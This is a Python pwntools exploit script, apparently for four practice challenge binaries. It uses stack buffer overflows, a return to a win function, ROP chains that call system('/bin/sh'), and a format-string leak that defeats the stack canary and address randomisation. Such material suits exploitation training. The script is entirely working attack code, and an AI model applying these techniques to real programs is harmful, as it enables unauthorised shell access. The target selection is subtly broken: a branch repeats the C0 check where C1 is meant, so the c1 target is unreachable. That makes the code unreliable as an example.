from pwn import *

qemu_cmd = "qemu-x86_64"
if args["GDB"]:
    qemu_cmd += " -g 1234 "

if args["C0"]:
    exe = "./c0"
elif args["C0"]:
    exe = "./c1"
elif args["C2"]:
    exe = "./c2"
elif args["C3"]:
    exe = "./c3"
else:
    print("please specifiy the target to run python3 exploit.py C1|C2|C3")
    exit(-1)

r = process(f"{qemu_cmd} {exe}", shell=True)


if args["GDB"]:
    _, io_gdb = gdb.attach(("localhost", 1234),api=True, exe=exe)
    io_gdb.execute("b main")
    io_gdb.execute("c")

r.recvuntil(b"overflow me:")

if args["C0"]:
    payload = 40 * b"\xff" # set admin fleg

elif args["C1"]:
    payload = 24* b"A" # filler
    payload += p64(0x401176) # address of win

elif args["C2"]:
    payload = 24* b"A" # filler
    # 0x000000000040118b : pop rdi ; ret
    payload += p64(0x000000000040118b)
    payload += p64(next(ELF("./c2").search(b"/bin/sh"))) # address of bin sh string
    payload += p64(0x401070) # address of system

elif args["C3"]:
    payload = b"%15$p.%11$pEOF"
    r.sendline(payload)
    leak = r.recvuntil(b"overflow me").decode().split("EOF")[0].split("\n")[-1]
    print(leak.split(".")[-1])
    canary = int(leak.split(".")[-1], 16)
    print(f'stack canary leaked: {hex(canary)}')

    main_addr = int(leak.split(".")[0], 16)
    print(f'main address leaked: {hex(main_addr)}')

    base_addr = main_addr - 0x1210

    # 0x00000000000011de : pop rdi ; ret
    pop_rdi_ret = base_addr + 0x11de
    bin_sh = next(ELF("./c3").search(b"/bin/sh")) + base_addr
    system = ELF("./c3").sym["system"] + base_addr
    
    payload = 40 * b"A" # filler
    payload += p64(canary)
    payload += p64(0xdeadbeef)
    payload += p64(pop_rdi_ret)
    payload += p64(bin_sh)
    payload += p64(system)


r.sendline(payload)

# intreact with the program
r.interactive()

